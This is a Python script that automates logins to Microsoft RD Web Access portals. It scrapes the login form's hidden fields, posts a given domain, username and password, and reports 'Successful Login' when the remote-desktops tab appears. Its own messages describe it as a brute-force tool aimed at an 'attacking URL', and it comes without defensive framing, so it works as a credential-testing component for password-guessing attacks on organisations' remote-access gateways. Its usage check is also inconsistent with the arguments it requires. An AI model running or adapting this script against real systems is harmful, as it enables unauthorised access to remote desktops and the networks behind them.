#!/usr/bin/python
import requests
import sys
from lxml import html

if len(sys.argv) != 5:  
    raise ValueError('Please provide URL to brute force e.g remote.website.com')
 
print(f'Script Name is {sys.argv[0]}')
 
BASE_URL = sys.argv[1]
domainName = sys.argv[2]
DomainUserName = sys.argv[3]
UserPass = sys.argv[4]
print(f'You entered :- ' + BASE_URL + ' as the attacking URL')
print(f'You entered :- ' + domainName + " as the logon domain name")
print(f'You entered :- ' + DomainUserName + ' as the logon username')
print(f'You entered :- ' + UserPass + ' as the logon password')

URL = "https://" + BASE_URL + "/RDWeb/Pages/en-US/Default.aspx"
domainName = domainName + "\\"

# Concatenate the URL
LOGIN_URL = "https://" + BASE_URL + "/RDWeb/Pages/en-US/login.aspx?ReturnUrl=%2fRDWeb%2fPages%2fen-US%2fDefault.aspx"

# Get request data
session_requests = requests.session()

# Get fields for post request
result = session_requests.get(LOGIN_URL)
tree = html.fromstring(bytes(result.text, encoding='utf8'))
WorkSpaceID = list(set(tree.xpath("//input[@name='WorkSpaceID']/@value")))[0]
RDPCertificates = list(set(tree.xpath("//input[@name='RDPCertificates']/@value")))[0]
PublicModeTimeout = list(set(tree.xpath("//input[@name='PublicModeTimeout']/@value")))[0]
PrivateModeTimeout = list(set(tree.xpath("//input[@name='PrivateModeTimeout']/@value")))[0]
WorkspaceFriendlyName = list(set(tree.xpath("//input[@name='WorkspaceFriendlyName']/@value")))[0]
RedirectorName = list(set(tree.xpath("//input[@name='RedirectorName']/@value")))[0]
isUtf8 = list(set(tree.xpath("//input[@name='isUtf8']/@value")))[0]
flags = list(set(tree.xpath("//input[@name='flags']/@value")))[0]
MachineType = list(set(tree.xpath("//input[@name='MachineType']/@value")))[0]

# Create Payload
payload = {
    "WorkSpaceID": WorkSpaceID,
    "RDPCertificates" : RDPCertificates,
    "PublicModeTimeout": PublicModeTimeout,
    "PrivateModeTimeout": PrivateModeTimeout,
    "WorkspaceFriendlyName": WorkspaceFriendlyName,
    "RedirectorName": RedirectorName,
    "isUtf8": isUtf8,
    "flags": flags,
    "DomainUserName": DomainUserName,
    "UserPass": UserPass,
    "MachineType": MachineType,
    }

# Perform Login
result = session_requests.post(LOGIN_URL, data = payload, headers = dict(referer = LOGIN_URL))

# Scrape URL for authenticated link
result = session_requests.get(URL, headers = dict(referer = URL))
tree = html.fromstring(result.content)
sucess = list(set(tree.xpath("//tab[@id='PORTAL_REMOTE_DESKTOPS']/@href")))[0]

print("[+] - " + sucess + " " + "Found")
print("[+] - Successful Login please try the credentials")
print("[+] - Username: " + DomainUserName)
print("[+] - Password: " + UserPass)
